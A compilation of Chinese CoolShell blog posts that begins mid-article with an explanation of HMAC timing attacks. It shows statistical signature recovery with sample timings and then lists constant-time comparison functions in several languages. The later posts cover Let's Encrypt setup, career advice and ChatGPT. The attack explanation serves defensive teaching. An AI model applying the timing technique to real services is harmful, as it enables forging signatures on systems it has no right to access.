写成伪代码大概是这个样子：于是，攻击者在不知道签名算法和私钥的情况下，但是知道API的调用接口时，就可以通过一边穷举签名，一边统计调用时间的方式来非常有效率的破解签名。在这篇文章《HMAC Timing Attacks》中记录了整个攻击的过程。文章中记载：如果一个签名有40个长度，如：`f5acdffbf0bb39b2cdf59ccc19625015b33f55fe` 攻击者，从 `0000000000000000000000000000000000000000` 开始穷举，下面是穷举第一个字符（从`0`到`f`因为这是HMAC算法的取值范围）的时间统计。0 0.005450913     1 0.005829198     2 0.004905407     3 0.005286876     4 0.005597611     5 0.004814430     6 0.004969118     7 0.005335884     8 0.004433182     9 0.004440246     a 0.004860263     b 0.004561121     c 0.004463188     d 0.004406799     e 0.004978907     f 0.004887240
可以看到，第一次测试通过的计时结果（以秒为单位），而值“ f”与样品的其余部分之间没有较大的变化量，所有结果看起来都非常接近。换句话说，有很多噪声掩盖了信号。因此，有必要进行多个采样（对测试进行缩放）并使用统计工具从噪声中滤除信号。为了将信号与噪声分开，我们必须按任意常数对测试进行缩放。通过实验，作者发现500是一个很好的数字。换句话说：运行测试500次，并记录500个试验中每个试验的结果。然后，通过人的肉眼观察可以可能看到 f 的调用明显比别的要长，但是这种方法很难自动化。所以，作者给了另一个统计算法，这个算法向服务器分别从 0 到 f 发出16个请求，并记录每个请求的响应时间，并将它们排序为1-16，其中1是最长（最慢）的请求，而16是最短（最快的请求），分别记录 0 – f 的名次，然后重复上述的过程 500 次。如下所示（仅显示25个样本，字符“ 0”首先被排名7、1、3，然后再次排名3……）：然后将每个字符的500个排名进行平均，得出以下示例输出："f", 5.302     "0", 7.17     "6", 7.396     "3", 7.472     "5", 7.562     "a", 7.602     "2", 7.608     "8", 7.626     "9", 7.688     "b", 7.698     "1", 7.704     "e", 7.812     "4", 7.82     "d", 7.826     "7", 7.854     "c", 7.86
于是，`f` 就这样脱颖而出了。然后，再对剩余的39个字符重复此算法。**这是一种统计技术，可让我们从噪声中滤出真实的信号** 。因此，总共需要调用：16 * 500 * 40 = 320,000个请求，而蛮力穷举需要花费16 ^ 40个请求。另外，学术界的这篇论文就宣称用这种计时攻击的方法破解了 OpenSSL 0.9.7 的RSA加密算法了。这篇 Remote Timing Attacks are Practical （PDF）论文中指出（我大致翻译下摘要，感兴趣的同学可以通过链接去看原文）：> > 计时攻击往往用于攻击一些性能较弱的计算设备，例如一些智能卡。我们通过实验发现，也能用于攻击普通的软件系统。本文通过实验证明，通过这种计时攻击方式能够攻破一个基于 > OpenSSL 的 web 服务器的私钥。结果证明计时攻击用于进行网络攻击在实践中可行的，因此各大安全系统需要抵御这种风险。参考资料：* Timing Attacks on RSA: Revealing Your Secrets through the Fourth Dimension   * Remote Timing Attacks are Practical
#### 各语言的对应函数下面，我们来看看各个语言对计时攻击的对应函数**PHP** :bool hash_equals ( string $known_string , string $user_string )boolean password_verify ( string $password , string $hash )**Java** : Java 在1.6时是有问题的，其在 1.6.0._17(6u17)才Fix了这个问题（相关的fix patch），下面是 JDK8源码 – `MessageDigest.isEqual()`**C/C++** ：没有在常用的库中找到相关的函数，还是自己写吧。return result; /* returns 0 if equal, nonzero otherwise */     }**Python** – 2.7.7+使用 `hmac.compare_digest(a, b)`，否则，使用如下的Django的代码#Taken from Django Source Codedef constant_time_compare(val1, val2):     """     Returns True if the two strings are equal, False otherwise.
The time taken is independent of the number of characters that match.For the sake of simplicity, this function executes in constant time only     when the two strings have the same length. It short-circuits when they     have different lengths.     """     if len(val1) != len(val2):     return False     result = 0     for x, y in zip(val1, val2):     result |= ord(x) ^ ord(y)     return result == 0**Go** – 使用 `crypto/subtle` 代码包func ConstantTimeByteEq(x, y uint8) int     func ConstantTimeCompare(x, y []byte) int     func ConstantTimeCopy(v int, x, y []byte)     func ConstantTimeEq(x, y int32) int     func ConstantTimeLessOrEq(x, y int) int     func ConstantTimeSelect(v, x, y int) int
#### One More Thing在文章结束前，再提一个事。上面的所有的代码都还有一个问题——他们都要判断字符串的长度是否一致，如果不一致就返回了，所以，通过时间攻击是可以知道字符串的长度的。比如：你的密码长度。理论上来说，字符串的长度也应该属于“隐私数据”（当然，对于签名则不是）。(全文完)# Coderun.com 在线开发IDE作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn相信大家都还记得我以前向大家推荐的《在线代码编译服务Codepad.org》吧。这回的这个更猛——在线的代码开发的IDE，可以编译，执行，调试。不过，主要针对Web方面的，主要是C#，ASP.NET，Javascript(JQuery)和PHP，很强大哦。那句话是怎么说来的——“如果一个软件可以用Javascript来写，那么这个软件的最终版本会是Javascript”。这个在线的IDE是：**http://www.coderun.com/ide/**!Coderun.com 在线开发IDE（点击看大图）有朋友在留言中说，这个项目可能不实用，没什么意思，而我想说，Google的Chrome OS项目可能非常喜欢这个东西。顺便说一下，这个Online的IDE是开源的，源码在这里：。
# 如何免费的让网站启用HTTPS作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天，我把CoolShell变成https的安全访问了。我承认这件事有点晚了，因为之前的HTTP的问题也有网友告诉我，被国内的电信运营商在访问我的网站时加入了一些弹窗广告。另外，HTTP的网站在搜索引擎中的rank会更低。所以，这事早就应该干了。现在用HTTP访问CoolShell会被得到一个 301 的HTTPS的跳转。下面我分享一下启用HTTPS的过程。我用的是 Let’s Encrypt这个免费的解决方案。Let’s Encrypt 是一个于2015年推出的数字证书认证机构，将通过旨在消除当前手动创建和安装证书的复杂过程的自动化流程，为安全网站提供免费的SSL/TLS证书。这是由互联网安全研究小组（ISRG – Internet Security Research Group，一个公益组织）提供的服务。主要赞助商包括电子前哨基金会，Mozilla基金会，Akamai以及Cisco等公司（赞助商列表）。2015年6月，Let’s Encrypt得到了一个存储在硬件安全模块中的离线的RSA根证书。这个由IdenTrust证书签发机构交叉签名的根证书被用于签署两个证书。其中一个就是用于签发请求的证书，另一个则是保存在本地的证书，这个证书用于在上一个证书出问题时作备份证书之用。因为IdenTrust的CA根证书目前已被预置于主流浏览器中，所以Let’s Encrypt签发的证书可以从项目开始就被识别并接受，甚至当用户的浏览器中没有信任ISRG的根证书时也可以。
以上介绍文字来自 Wikipedia 的 Let’s Encrypt 词条。为你的网站来安装一个证书十分简单，只需要使用电子子前哨基金会EFF的 Certbot，就可以完成。1）首先，打开  网页。2）在那个机器上图标下面，你需要选择一下你用的 Web 接入软件 和你的 操作系统。比如，我选的，`nginx` 和 `Ubuntu 14.04`3）然后就会跳转到一个安装教程网页。你就照着做一遍就好了。以Coolshell.cn为例 – Nginx + Ubuntu首先先安装相应的环境：$ sudo apt-get update     $ sudo apt-get install software-properties-common     $ sudo add-apt-repository ppa:certbot/certbot     $ sudo apt-get update     $ sudo apt-get install python-certbot-nginx然后，运行如下命令：$ sudo certbot --nginx`certbot` 会自动检查到你的 `nginx.conf` 下的配置，把你所有的虚拟站点都列出来，然后让你选择需要开启 https 的站点。你就简单的输入列表编号（用空格分开），然后，certbot 就帮你下载证书并更新 `nginx.conf` 了。
你打开你的 `nginx.conf` 文件 ，你可以发现你的文件中的 `server` 配置中可能被做了如下的修改：listen 443 ssl; # managed by Certbot     ssl_certificate /etc/letsencrypt/live/coolshell.cn/fullchain.pem; # managed by Certbot     ssl_certificate_key /etc/letsencrypt/live/coolshell.cn/privkey.pem; # managed by Certbot     include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot和这里建议配置 http2，这要求 Nginx 版本要大于 1.9.5。HTTP2 具有更快的 HTTPS 传输性能，非常值得开启（关于性能你可以看一下这篇文章）。需要开启HTTP/2其实很简单，只需要在 `nginx.conf` 的 `listen 443 ssl;` 后面加上 `http2` 就好了。如下所示：
listen 443 ssl http2; # managed by Certbot     ssl_certificate /etc/letsencrypt/live/coolshell.cn/fullchain.pem; # managed by Certbot     ssl_certificate_key /etc/letsencrypt/live/coolshell.cn/privkey.pem; # managed by Certbot     include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot然后，就 `nginx -s reload` 就好了。但是， **Let’s Encrypt 的证书90天就过期了** ，所以，你还要设置上自动化的更新脚本，最容易的莫过于使用 `crontab` 了。使用 `crontab -e` 命令加入如下的定时作业（每个月都强制更新一下）：0 0 1 * * /usr/bin/certbot renew --force-renewal     5 0 1 * * /usr/sbin/service nginx restart
当然，你也可以每天凌晨1点检查一下：`0 1 * * * certbot renew `注：crontab 中有六个字段，其含义如下：* 第1个字段：分钟 (0-59)   * 第2个字段：小时 (0-23)   * 第3个字段：日期 (1-31)   * 第4个字段：月份 (1-12 [12 代表 December])   * 第5个字段：一周当中的某天 (0-7 [7 或 0 代表星期天])   * /path/to/command – 计划执行的脚本或命令的名称**这么方便的同时，我不禁要问，如果是一些恶意的钓鱼网站也让自己的站点变成https的，这个对于一般用来说就有点难以防范了。哎……**当然，在nginx或apache上启用HTTPS后，还没有结束。因为你可能还需要修改一下你的网站，不然你的网站在浏览时会出现各种问题。**启用HTTPS后，你的网页中的所有的使用`http://` 的方式的地方都要改成 `https://` 不然你的图片，js， css等非https的连接都会导致浏览器抱怨不安全而被block掉**。所以，你还需要修改你的网页中那些 hard code `http://` 的地方。
对于我这个使用wordpress的博客系统来说，有这么几个部分需要做修改。1）首先是 wordpress的 常规设置中的 “ **WordPress 地址** ” 和 “ **站点地址** ” 需要变更为 https 的方式。2）然后是文章内的图片等资源的链接需要变更为 https 的方式。对此，你可以使用一个叫 “Search Regex” 插件来批量更新你历史文章里的图片或别的资源的链接。比如：把 `http://coolshell.cn` 替换成了 `https://coolshell.cn`3）如果你像我一样启用了文章缓存（我用的是WP-SuperCache插件），你还要去设置一下 “ **CDN** ” 页面中的 “Site URL” 和 “off-site URL” 确保生成出来的静态网页内是用https做资源链接的。基本上就是这些事。希望大家都来把自己的网站更新成 https 的。嗯，12306，你什么时候按照这个教程做一下你的证书？（全文完）# Glassfish ESB 的教程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
OpenESB项目实现了一个运行期企业服务总线(Enterprise Service Bus:ESB)使用JBI(Java业务集成)作为核心基础。OpenESB可以让你集成企业应用与Web Service松散地连接成复合的应用程序。这使得你可以无缝地组合与拆解该复合应用程序，并认识到一个真正面向服务架构(SOA)的优点。BPEL是一种编程语言，它明确定义了基于Web服务的业务流程。BPEL在支持业务伙伴间的长时间会话方面表现尤为卓越。BPEL将成为基于Web服务的业务流程最广泛采用的标准，这一趋势早在该标准正式发布前就已经非常明显。BPEL适用于支持业务流程逻辑的“宏观编程”。这些业务流程均是完整而独立的应用，它们将Web服务作为实现其业务功能的“活动”。BPEL不致力于成为通用的编程语言，相反，它的应用设想就是与其他实现业务功能（“微观编程”）的编程语言结合使用。OpenESB上有一些BPEL教程都是非常有趣的，下面一些教程的例子：# 程序员眼中的编程语言作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下图是一个搞笑的图片——程序员眼中的编程语言。
* 图片的横轴是编程语言。   * 纵轴是各语言的程序员、粉丝、信徒。   * 中间的各个小图片则是，粉丝眼中的编程语言的形象。比如说，* 第一行第一列，是Java程序员看Java语言的样子，一幢现代化的大厦。   * 第一行第二列，是Java程序员看C语言，一个年老过时的骨灰级老头。   * 当然，C程序员看Java语言也比较搞，见第二行第一列。呵呵。其它的大家自己看吧。还有另外一个关于操作系统的《粉丝眼中的操作系统》!程序员眼中的编程语言# 质量管理经中的八个法则作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn质量管理在软件工程中是非常非常重要的一个环节，无论你有多么精妙的算法，或是使用了多么先进的技术，还是拥有了多少强的设计，在质量控制或质量管理面前，这些都可能什么都不是。这里，有一些质量管理的法则，可以让软件的用户从中受益。如果对质量管理一言以蔽之：面对一个长期不断需要改善的软件，当其用户或是管理者们来说，他们对某个组织所提供的标准有一种完全和最基本的信任。下面，我们给出8个质量管理的法则：**1\. 始终从用户角度出发:** “无论何时何地，我们都需要明白用户当前的或未来的需求，并能够达到用户的需求，甚至超出用户的期望。”
这是整个软件工程的重中之重。质量管理从某种意义上来说，就是实现用户需求的质量的管理。这需要我们的质量管理管理和用户的关系，以及把用户的需求和整个团队（开发组，测试组，产品组，项目组等等）进行有些的沟通管理。**2\. 领导能力:** “领导者需要建立一个团结统一的有明确方向的团队。这个团队可以创造并维护一种良好的内部气氛，这种氛围可以使得所有的人都能参与进来，从而达到整个团队的目标。”对此，我们需要有一个有前瞻性的领导能为整个团队创建一种相互信任的环境。提倡诚实，并积极引导团队成员。从而可以激励每个人，并创建一种策略（比如奖罚机制）来达到这这些目标。**3\. 团队成员主动参与性:** “团队成员总是有不同分工和不同职责的，只有所有的团队成员都参与进来，那么整个项目或是整个软件的各个部分，各个方面才会得到完美的发挥。”对此，让团队成员有主人翁精神，让他们觉得自己是工作或任务的所有者，是是否能让所有成员主动参与的关键。这里，我们还需要让每个被参与者都要从关注于用户的角度出发，并且帮助和支持团队成员，以及为他们营造一个比较满意的工作环境。**4\. 流程方法:** “我们需要一个非常有效率的流程或方法来把所有的资源和日常工作活动整合在一起，形成一种生产线式的生产模式”
对此，定义一个合适的流程（注意这里是合适的流程，好的流程并不一定就是合适的）。这个流程需要有确定整个日常生产活动的输入，输出以及其功能。风险管理，分配责任，以及管理外部和内部的用户。**5\. 系统方法管理:** “确定，理解，并管理一个系统相关的流程，以使得整个团队能够有效并快速地自我改善。”对此，定义一个系统的组织架构，这个组织架构是高效和有效的。这里我们需要了解到团队的需求（硬件的，软件的，人员的，等等），并了解一些可能会发生的限制。这样我们才能有效地管理整个团队系统。**6\. 连续的改进:** “不断地改进是一个团队需要给自己设制的永久目标”对此，工作效率上的改进是整个改进的重中之重。工作效率方面，有大程度上取决于工作流程的改进，所以，流程改进是非常重要的，也是需要长期不断去努力改进的。要达到这一目标，一般来说，我们可以使用“计划——执行——检查——总结”这样的循环。**7\. 决策中的事实说话:** “只有基于对实际数据和信息的分析后，我们才能制定出有效的决策和行动”对此，我们需要注意日常数据和信息的收集，并且我们需要对采集到的数据和信息的精确性进行测量。这样才能让我们在进行决策和行动能基于正确的数据。
**8\. 互惠互利:** “一个团队中的各个部门或各个子团队虽然是在功能上是独立的，但是，一个互惠互利的局面可以增强整个团队或公司的整体能力并创建更大的价值。”对此，我们需要一个健康的团队之间的关系。好的沟通只能让团队获益一时，而只有建立一个长期互惠互利关系或局面，才是长期。（全文完）# 三个事和三个问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn从9月份开始，是很多在校毕业生的择业时期，有很多很多朋友写邮件给我让我帮他们参考如何选择工作（对不起我无法在第一时间回信，因为实在是太多了，我那繁忙工作和生活都没办法让我能即时回复），并且还有一个已经工作了多年的技术很强的朋友因为跳槽没有跳好，也和我说了很多他 的感受。从这个过程中让我有了很多感触和想法想和大家分享，本来这篇文章1个月前就想写的，只是要写下来时不知道如何整理这么多的东西和思绪。今天也不知道，但是一定要写了，不然，我的这些感触和想法就会越来越不新鲜了。**注：这篇文章里的所有的故事都是真实的** ， **其不可避免地会加上我 ** ** **强烈的****** 个人情怀和个 ** **人色彩****** ， **叙述的过程可能比较乱，但我能确保这些都是我的肺腑之言** 。
目录* 第一个事：网友的来信   * 第二个事：Amazon的校园招聘   * 第三个事：朋友的跳槽   * 三个问题#### 第一个事：网友的来信第一个故事是一个杭州的学生的故事，其有两个offer，一个是北京的（雅虎研发中心），另一个是杭州的一个做商业智能软件的公司，也是美国的上市公司。他在给我的来信内心纠结地说：> > 雅虎其实很想去，虽然这几年雅虎走下坡，但还是大公司，牌子硬，里面牛人也多，有助于自己水平的提升。但感觉北京环境不好，生活不是那么舒坦，也搞不定户口，所以我去的话也只能干个三五年就得考虑跳槽到别的城市安家落户了。这么一跳，在北京积累的各种资源却又带不走 > 。 > > > 杭州，比北京更适合生活，户口不是问题，朋友多，这个公司也比较宽松，有较多的业余时间跟朋友们一起搞点东西。而且这些年这个公司上升的势头，在国内设研发中心也才4年，规模不大，公司本身规模也还不大，我觉得机会还不错。再加上离家近，对家人大概可以多些照应。 > > > 关于未来换工作，雅虎做的是搜索，广告，移动互联这几个方面的，东西在互联网企业里面都比较通用，以后跳槽的话，面相对比较宽。杭州的那个做商业智能的公司，据了解其他做的比较好的也就几个大公司如SAP，IBM有这方面的业务。
我和这个同学发了邮件，也打了长途电话，我基本上是这样回复的——1） **户口，离家近，安逸的生活，相比起你的人生经历，你的眼界，你的发展，什么都不是** 。千万不要让户口限制了你的人生，如果要过安逸轻松的生活，最佳方案是进政府部门，既然要活在体制外，就一定是靠能力，靠经历，一定要有好的经历和能力。2） **眼界，眼界，眼界** 。这是我们这个国家里的人最需要的东西了，你的眼界决定了你的人生。我对杭州的这家公司一无所知，但是我知道雅虎的一些好处：a）互联网企业，其天地明显要比BI广阔很多，b）技术强，能人多（看雅虎的面试的难度以及一些产品就知道了），c）外企，可以练英语。d) 跨国公司，可以开眼界，或许会有出国机会。e）北京，几乎所有的知名公司都在这里有基地，这里的技术氛围在全国数一数二。 **为了经历和眼界，辛苦几年又有何妨？！人生还是需要有激情的。**3） **经历，经历，经历** 。问自己一下，我们会在毕业的第一份工作呆上一辈子吗？不会吧。就算不喜欢北京，就算雅虎这个公司并不完美，但是雅虎的经历，能为你开启一个更为广阔的天地。4）我认为一个有过几乎失败经历的公司会更牛。Apple被打趴下过，Amazon也被打趴下过， **只有被打趴下过而又能站起来的公司和人才是 **真正伟大的**** 。如果Yahoo还能站起来，它一定会是一个伟大的公司。
小伙子是个很聪明的人，也是个对生活有激情的人，所以，最后毁了“三方”选择了雅虎。他说：> > 最终选择雅虎的原因是，我觉得趁早年轻先出去看看，北京还是一个开阔视野的好地方。我要是一开始就选择杭州，以后估计不太会出去了，人生短暂，我还是希望多经历一些多体会一些。我从不畏惧在北京是否有户口，那里的房价是否承受的起，我觉得一个刚毕业的学生没必要太多的考虑这些问题，最重要的是考虑自己的发展。而我的心情却有些复杂，一方面，我觉得一个人的一生可能就此被我改变了，我的心里很复杂。另一方面，万一他来北京不是很顺怎么办？会不会说我骗了他？在这里，我想对这个朋友说——“保持你的热情，努力开你的眼界，努力提高你的能力，你不可能走得不好的，就算雅虎有一天倒下了，也会有很多个更好机会等着你的，我会一直在你身边帮助你的”。这样的来信还有很多很多，户口，薪资，是否去大城市，几乎都成了大家考虑的重点。这个年代实在是太浮躁了。我在此想告诉大家，对于你的人生你应该把“ **和什么样的人做什么样的事** ”提到你择业优先级最高的地位，没有之一。我的答案是，“ **和有激情能做事的人做有意义的事** ”。**生活在如此刺激的年代，一定要去经历那些最刺激最有意义的东西，这样人生才会变得有意义。**
#### 第二个事：Amazon的校园招聘在Amazon校招的其间发生了一些有意思的事，比如：1）在哈尔滨校招过后，我被公司里的一些同事亲切地称为“体型魁梧的男子”，呵呵。希望这位同学毕业的时候还能来Amazon面试，这样，我就能再“虐你一次”。哈哈。2）这次Amazon的校招在北京，天津，西安，武汉，哈尔滨等地进行了招聘，大家知道我们用什么面试题来面这些快毕业的学生吗？我们用面试高级程序员的问题来面试这些刚毕业的学生（我和我的团队里的那些高级程序员说：“你们应该庆幸你们面试的时候没有被回这些问题”）。你知道我们有什么样的收获？主要有两点收获：* **武汉的学生太给力了** 。你们的能力超出了所有其它城市的学生，包括北京。这让我们很诧异，搞得我们几个经理都在思考是不是要去武汉建Amazon的研发分部去了。我个人的分析是： **武汉属于中心城市和北京等大城市的沟通相当地好，在这里的学生和在北京的学生有一样的眼界和技术氛围，但却没有在大城市的同学们的浮燥，能踏下心来专研技术** 。* **学C++的同学比学Java的同学解决问题的能力更强** 。因为两个原因，a) C++需要了解系统知识，b) C++的程序员几乎什么事都得自己干。（参看我的《如何学好C语言》和《如何学好C++语言》，当然，Java还是很牛的，比如OO方面）
3）有一个同学接受了Amazon的offer后，给我来信诉说，给他打电话的经理告诉他要做的是测试为主的工作。然后，他给我发邮件来和倾诉，我说， **如果你不喜欢，你就要说出来，不要将就，将就出来的人生只会平添许多烦恼和后悔** 。在此，我想在这里澄清两个事：* Amazon不会强行把你分配到团队中，只要你有想去的团队，你就应该说出来。我们一开始会内部做分配，这样做只是为了效率，但是这并不代表你已经被最终分配到那个团队中去了，无法再调整了。只要你提出来你想做什么。我们会把你的要求放在第一位，并尽最大的可能满足你的要求。相信经理们给你们电话的时候都说过这样的内容了。* Amazon所有的“蓝卡员工”（在Amazon工作5年以内的员工）在工作满一年后，可以有条件地在Amazon内部transfer。条件只有一个：你的工作业绩要很不错，在相同级别的员工中是中坚力量。你可以直接申请其它团队的招聘职位（这个其它团队包括了美国总部在内的全世界的团队），经过流程简单的面试就可以正式transfer。没有人可以阻止你，那怕是Jeff Bezos也无权阻止你。（这个政策要比北京户口更有价值吧？！Think it Big!）
4）最后一个有关校园招聘的事发生在我的团队。我觉得我可能要失去这个获得offer的学生了。他在腾讯和亚马逊之间更倾向于腾讯，因为他在腾讯实习过。他一开始的理由主要是，一个是户口问题，腾讯可以解决户口，另一个是他想做底层的C/C++，而不是Java。后面的理由又转变为腾讯的团队文化，等等。我已经给他打过两次电话了，也和他说过许多，和第一个故事里说得差不多。对于是否做C/C++还是Java这方面的事，他和我说，他想在某一个领域成为一个专家。我对他说的这个专家有些模糊，我只是和他说——“ **软件的精髓不在于你对系统底层有多了解，也不在语言层面，而是在于设计和架构，而设计和架构这种东西只能靠多想多看** ”，我和他说，Amazon不是一个喜欢分享的公司，Amazon内部很多技术和设计水平可能是外部的人无法想像的。我希望他能来我的团队和大家工作一段时间真正感受一下，再做打算。（当然，要是他不明白这些事，我也觉得他不来也没有什么可惜的）另外，我想对所有的人说：“ **这个世界上有两种公司，一种是“劳动密集型”的公司，另一种是“知识密集型”的公司，很多公司把软件做成了一种“劳动密集型”的活动，在那里永远无法做出能够让业界所震撼的东西，而有的公司才能把其做成“知识密集型”的公司，在那里，你会看到世界因为他们而改变** ”。如果你不能理解这句话的话，你不妨想像一个网上卖书的的公司干出连Google都赶不上的“平台”（参看“Steve Y的Amazon和Google平台论”），你不妨想像一个做MP3播放器的公司可以改变唱片业乃至改变世界。
不管这位同学最终能不能成选择我的团队的一员，我都会送你一本《Steve Jobs》，额外，我还会送你一件我团队自己制作的T恤（见下图，谢谢我的HR Recruiter当模特）。#### 第三个事：朋友的跳槽我有一个普通朋友，几个月前跳槽去了一家正在高薪挖人的国内的快要准备IPO的公司。他们开出的薪水和条件非常地诱人。给我这个朋友的开出薪水和那个职位诱惑力太大了。一般人都很难拒绝。但是，当他入职了以后，他发现了这个公司内有很多东西是相当恶心和让他无法接受的，这个公司就可能连“劳动密集型”的公司都不算，非常发不重视技术，在技术上做的东西相当地不规范，在那里的技术人员不但相当地苦逼，而且干的事相当的垃圾，出了问题，所有的团队都在互相推诿，管理非常混乱。这让我的那个朋友非常地难受，在那里的每一天都是一种煎熬，而且他无法改变，高管也很难改变这种局面。整个公司在一种疯狂地暗无天日的状态下工作。我对这个朋友目前的善感到担忧。但是，我想借这个事来谈谈我的想法。我承认薪水和职位是一种价值，但是，人生的价值只有这个吗？你一年少了那几万块钱，你也穷不了，你多了那几万块钱，你也富不了，为什么不去追求那些比那几万块钱更有价值的东西呢？对于我来说，我觉得，最有价值的东西就是—— **能和那些有梦想有追求有能力的人一起去经历那些最有意义的事情，那些能够造福社会、改变世界、创造历史的事情** 。
我从我的上一份工作到现在的工作，我的薪水不但没怎么涨，只是执平，而我的职位还比上一家公司降了一级（而且我还放弃两年内职位还可能再次晋升的机会），我管的团队从4个团队减到了一个很小的5个人左右的团队（现在我坚持小的团队做大事）。我来Amazon之前，这个事让我整整思考了2个多月。最终我发现， **职位和薪水这些对我来说都无所谓，因为我是做事的人，而只有有意义的经历才能真正喂饱我** 。而我目前在Amazon里做的这个事，是可能改变历史的事，是那种可以让我一想起来就会兴奋的事。**我知道，价值并不仅仅只是名利权，对此我只想说，不要把自己给卖了** 。#### 三个问题其实，我还有很多故事可以讲，只不过我写得太多了，差不多到文章该结束的时候了。那些事改天再说吧。我经历的这些事让我思考了很多很多。每年年底都是我情绪比较低沉的时候，因为，这个时候是我反思一年中的得失的时候，在这个时间段里，我会有一些不安，那种我害怕已经虚度了这一年的那种不安。2011年的年底，我问了我自己三个问题：**1）每天早上醒过来的时候，我会为什么感到兴奋？是什么在驱动着我去开始新的一天？****2）现在的经历有没有让我有这种兴奋的感觉？这种让我充满力量和期待的感觉？**
**3）有没有浮燥，有没有得到认可？身边的人的认可？但更重要的是自己是否对自己认可？**我把我自己的这三个问题共享给大家，我有我的答案，相信你也有你的答案。**在2011年的年底，我希望大家的2011年没有虚度，而2012年能经历那些有意义的的事。****提前祝大家新年快乐！**# 我看ChatGPT: 为啥谷歌掉了千亿美金作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn两个月前，我试着想用 ChatGPT 帮我写篇文章《eBPF 介绍》，结果错误百出，导致我又要从头改一遍，从那天我觉得 ChatGPT 生成的内容完全不靠谱，所以，从那天开始我说我不会再用 ChatGPT 来写文章（这篇文章不是由 ChatGPT 生成），因为，在试过一段时间后，我对 ChatGTP 有基于如下的认识：1. **ChatGPT 不是基于事实，是基于语言模型的** ，事实对他来说不重要，对他重要的是他能读懂你的问题，并按照一定的套路回答你的问题。   2. **因为是基于套路的回答，所以，他并不能保证内容是对的，他的目标是找到漂亮的精彩的套路** ，于是，你会发现，他的内容组织能力和表述还不错，但是只要你认真玩上一段时间，你会发现，ChatGPT 那些表述的套路其实也比较平常一般。它的很多回答其实都不深，只能在表面上。就像 Github 的 Copilot 一样，写不了什么高级的代码，只能帮你写一些常规格式化的代码（当然，这也够了）
ChatGPT 就是一个语言模型，如果不给他足够的数据和信息，它基本就是在胡编乱造所以，基于上面这两个点认识，以发展的眼光来看问题，我觉得 ChatGPT 这类的 AI 可以成为一个小助理，他的确可以干掉那些初级的脑力工作者，但是，还干不掉专业的人士，这个我估计未来也很难，不过，这也很帅了，因为大量普通的工作的确也很让人费时间和精力， **但是有个前提条件——就是ChatGPT所产生的内容必需是真实可靠的，没有这个前提条件的话，那就什么用也没有了** 。今天，我想从另外一个角度来谈谈 ChatGPT，尤其是我在Youtube上看完了微软的发布会《Introducing your copilot for the web: AI-powered Bing and Microsoft Edge 》，才真正意识到Google 的市值为什么会掉了1000亿美元，是的， **谷歌的搜索引擎的霸主位置受到了前所未有的挑战** ……我们先来分析一下搜索引擎解决了什么样的用户问题，在我看来搜索引擎解决了如下的问题：* **知识或信息索引** 。查新闻，查股票，查历史，查文档，找答案……   * **找服务提供商** 。找卖东西的电商，找帮你修东西的服务，找软件……   * **信息的准确和可靠** 。搜索引擎的rank算法保证了最准确、最有用、最权威的信息出现在最前面……（作恶的百度不在此列）
基本上就是上面这几个，搜索引擎在上面这几件事上作的很好，但是，还是有一些东西搜索引擎做的并不好，如：* **搜索引擎是基于关键词的，不是基于语义的** 。所以，搜索引擎并不知道你的真实需求，因此，你会不可避免地要干下面的事，      * 你经常要不断地增加或调整不同的关键词来提高查询信息的准确度……     * 你经常要在你查找的信息中进行二次或多次过滤和筛选……   * **搜索引擎是只能呈现内容，无法解读内容** 。所以，你找到相关的链接后，你还要花大量的时间来阅读理解，经常性的你不可避免的要干下面的事：      * 打开一个链接，读到了一大半后，发现你要的内容不在其中，只能关掉再打开一个……     * 你想要的内容是在的，但是太晦涩，看不懂，太费解，你要找小白友好的版本……     * 你想要的内容不完整，你需要在很多个链接和网页上做拼图游戏……     * 内容是无法结构化的展示的，你搜到的东西全都是碎片信息   * **搜索引擎没有上下文关联，两次搜索是没有关系的** 。也就是说，人知道的越多，问题也就越多，所以，我们经常会面临下面的问题：      * 随着我了解的越多，我的信息搜索的会出现分支，这个分支只有我自己的管理，搜索引擎是不关心的，导致我每次都相当于从头开始……     * 你做计划的时候，你需要从多个不同的搜索中获取你想要的东西，最终组合成你定制化的东西，比如做旅游计划……
好了，我们知道， **ChatGPT 这类的技术主要是用来根据用户的需求来按一定的套路来“生成内容”的** ，只是其中的内容并不怎么可靠，那么，如果把搜索引擎里靠谱的内容交给 ChatGPT 呢？那么，这会是一个多么强大的搜索引擎啊，完全就是下一代的搜索引擎，上面的那些问题完全都可以解决了：* 你可以打一段话给搜索引擎，ChatGPT 是读得懂语义的。   * 因为知道语义，于是在众多搜过结果中，他更知道哪些是你想要的内容。   * ChatGPT 可以帮你生成 TL;DR，把长文中的要求总结出来形成更易读的短文   * ChatGPT 可以帮你整理内容，在多个网页中帮你整合和结构化内容   * ChatGPT 可以有上下文对话，你可以让他帮你不断通过更多的关键词搜索信息，并在同一个主题下生成、组织和优化内容**一旦 ChatGPT 利用上了搜索引擎内容准确和靠谱的优势，那么，ChatGPT 的能力就完全被释放出来了，所以，带 ChatGPT 的搜索引擎，就是真正的“如虎添翼”！**因此，微软的 Bing + ChatGPT，成为了 Google 有史以来最大的挑战者，我感觉——所有跟信息或是文字处理相关的软件应用和服务，都会因为 ChatGPT 而且全部重新洗一次牌的，这应该会是新一轮的技术革命…… **Copilot 一定会成为下一代软件和应用的标配！**
